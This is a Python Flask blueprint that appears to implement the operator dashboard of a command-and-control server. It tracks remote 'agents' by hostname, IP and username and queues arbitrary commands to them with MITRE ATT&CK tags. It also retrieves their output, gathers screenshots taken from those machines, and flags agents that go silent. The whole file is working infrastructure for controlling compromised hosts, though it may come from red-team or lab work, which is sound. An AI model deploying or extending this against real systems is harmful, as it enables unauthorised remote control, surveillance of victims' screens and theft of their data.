from flask import Blueprint, jsonify, request, render_template
from datetime import datetime, timedelta
from database import db, Agent, Task, Result, AgentNote, EventLog
from routes.auth import require_login
import mitre

operator_bp = Blueprint('operator', __name__)


def _log(event_type, agent_id=None, hostname=None, desc=''):
    ev = EventLog(event_type=event_type, agent_id=agent_id,
                  agent_hostname=hostname, description=desc)
    db.session.add(ev)


# ── Pages ──────────────────────────────────────────────────────────────────────

@operator_bp.route('/dashboard')
@require_login
def dashboard():
    return render_template('dashboard.html')


# ── Stats / agents ─────────────────────────────────────────────────────────────

@operator_bp.route('/api/stats')
@require_login
def stats():
    _mark_inactive()
    total     = Agent.query.count()
    active    = Agent.query.filter_by(status='active').count()
    pending   = Task.query.filter_by(status='pending').count()
    completed = Task.query.filter_by(status='completed').count()
    return jsonify({
        'total_agents': total, 'active_agents': active,
        'inactive_agents': total - active,
        'pending_tasks': pending, 'completed_tasks': completed,
    })


@operator_bp.route('/api/agents')
@require_login
def get_agents():
    _mark_inactive()
    agents = Agent.query.order_by(Agent.last_seen.desc()).all()
    pending_counts = {
        a.id: Task.query.filter_by(agent_id=a.id, status='pending').count()
        for a in agents
    }
    return jsonify([{
        'id': a.id, 'hostname': a.hostname, 'ip': a.ip,
        'os': a.os, 'username': a.username,
        'first_seen': _iso(a.first_seen), 'last_seen': _iso(a.last_seen),
        'status': a.status, 'pending_tasks': pending_counts[a.id],
    } for a in agents])


# ── Tasks ──────────────────────────────────────────────────────────────────────

@operator_bp.route('/api/task', methods=['POST'])
@require_login
def queue_task():
    data = request.get_json()
    tag  = mitre.tag(data['command'])
    task = Task(
        agent_id    = data['agent_id'],
        command     = data['command'],
        mitre_id    = tag['id']     if tag else None,
        mitre_name  = tag['name']   if tag else None,
        mitre_tactic= tag['tactic'] if tag else None,
        mitre_color = tag['color']  if tag else None,
    )
    db.session.add(task)
    agent = db.session.get(Agent, data['agent_id'])
    hostname = agent.hostname if agent else data['agent_id']
    _log('task_created', data['agent_id'], hostname,
         f"Queued: {data['command'][:80]}" + (f" [{tag['id']}]" if tag else ''))
    db.session.commit()
    return jsonify({'task_id': task.id, 'status': 'queued',
                    'mitre': tag})


@operator_bp.route('/api/task/<task_id>/cancel', methods=['POST'])
@require_login
def cancel_task(task_id):
    task = db.session.get(Task, task_id)
    if not task:
        return jsonify({'error': 'Not found'}), 404
    if task.status != 'pending':
        return jsonify({'error': 'Only pending tasks can be cancelled'}), 400
    task.status = 'cancelled'
    db.session.commit()
    return jsonify({'status': 'cancelled'})


@operator_bp.route('/api/pending/<agent_id>')
@require_login
def get_pending(agent_id):
    tasks = (Task.query
             .filter_by(agent_id=agent_id)
             .filter(Task.status.in_(['pending', 'delivered']))
             .order_by(Task.created_at.desc()).all())
    return jsonify([{
        'id': t.id, 'command': t.command,
        'status': t.status, 'created_at': _iso(t.created_at),
        'mitre_id': t.mitre_id, 'mitre_name': t.mitre_name,
        'mitre_color': t.mitre_color,
    } for t in tasks])


# ── Results ────────────────────────────────────────────────────────────────────

@operator_bp.route('/api/results/<agent_id>')
@require_login
def get_results(agent_id):
    results = (Result.query
               .filter_by(agent_id=agent_id)
               .order_by(Result.received_at.desc())
               .limit(100).all())
    task_ids = [r.task_id for r in results]
    tasks = {t.id: t for t in Task.query.filter(Task.id.in_(task_ids)).all()}
    return jsonify([{
        'id': r.id, 'task_id': r.task_id,
        'command':     tasks[r.task_id].command     if r.task_id in tasks else '?',
        'mitre_id':    tasks[r.task_id].mitre_id    if r.task_id in tasks else None,
        'mitre_name':  tasks[r.task_id].mitre_name  if r.task_id in tasks else None,
        'mitre_tactic':tasks[r.task_id].mitre_tactic if r.task_id in tasks else None,
        'mitre_color': tasks[r.task_id].mitre_color  if r.task_id in tasks else None,
        'output': r.output, 'received_at': _iso(r.received_at),
    } for r in results])


# ── Screenshots (for gallery) ──────────────────────────────────────────────────

@operator_bp.route('/api/screenshots')
@require_login
def get_screenshots():
    results = (Result.query
               .filter(Result.output_type == 'screenshot')
               .order_by(Result.received_at.desc())
               .limit(200).all())
    agent_ids = list({r.agent_id for r in results})
    agents = {a.id: a for a in Agent.query.filter(Agent.id.in_(agent_ids)).all()}
    return jsonify([{
        'id':        r.id,
        'agent_id':  r.agent_id,
        'hostname':  agents[r.agent_id].hostname if r.agent_id in agents else r.agent_id,
        'b64':       r.output[len('[SCREENSHOT_B64]'):],
        'taken_at':  _iso(r.received_at),
    } for r in results])


# ── Agent notes ────────────────────────────────────────────────────────────────

@operator_bp.route('/api/notes/<agent_id>', methods=['GET'])
@require_login
def get_notes(agent_id):
    notes = (AgentNote.query.filter_by(agent_id=agent_id)
             .order_by(AgentNote.created_at.desc()).all())
    return jsonify([{'id': n.id, 'content': n.content,
                     'created_at': _iso(n.created_at)} for n in notes])


@operator_bp.route('/api/notes/<agent_id>', methods=['POST'])
@require_login
def add_note(agent_id):
    data = request.get_json()
    note = AgentNote(agent_id=agent_id, content=data.get('content', '').strip())
    db.session.add(note)
    db.session.commit()
    return jsonify({'id': note.id, 'content': note.content,
                    'created_at': _iso(note.created_at)})


@operator_bp.route('/api/notes/delete/<note_id>', methods=['POST'])
@require_login
def delete_note(note_id):
    note = db.session.get(AgentNote, note_id)
    if note:
        db.session.delete(note)
        db.session.commit()
    return jsonify({'status': 'deleted'})


# ── Single agent detail ────────────────────────────────────────────────────────

@operator_bp.route('/api/agent/<agent_id>')
@require_login
def get_agent(agent_id):
    _mark_inactive()
    a = db.session.get(Agent, agent_id)
    if not a:
        return jsonify({'error': 'Not found'}), 404
    total     = Task.query.filter_by(agent_id=agent_id).count()
    completed = Task.query.filter_by(agent_id=agent_id, status='completed').count()
    pending   = Task.query.filter_by(agent_id=agent_id, status='pending').count()
    last_res  = (Result.query.filter_by(agent_id=agent_id)
                 .order_by(Result.received_at.desc()).first())
    return jsonify({
        'id': a.id, 'hostname': a.hostname, 'ip': a.ip,
        'os': a.os, 'os_version': a.os_version, 'username': a.username,
        'first_seen': _iso(a.first_seen), 'last_seen': _iso(a.last_seen),
        'status': a.status,
        'tasks_total': total, 'tasks_completed': completed, 'tasks_pending': pending,
        'last_output': last_res.output[:200] if last_res else None,
        'last_result_at': _iso(last_res.received_at) if last_res else None,
    })


# ── Helpers ────────────────────────────────────────────────────────────────────

def _mark_inactive():
    cutoff = datetime.utcnow() - timedelta(minutes=2)
    stale = Agent.query.filter(Agent.last_seen < cutoff, Agent.status == 'active').all()
    for a in stale:
        a.status = 'inactive'
        _log('agent_lost', a.id, a.hostname, f"Agent went silent (last seen {_iso(a.last_seen)})")
    if stale:
        db.session.commit()


def _iso(dt):
    return dt.isoformat() if dt else None
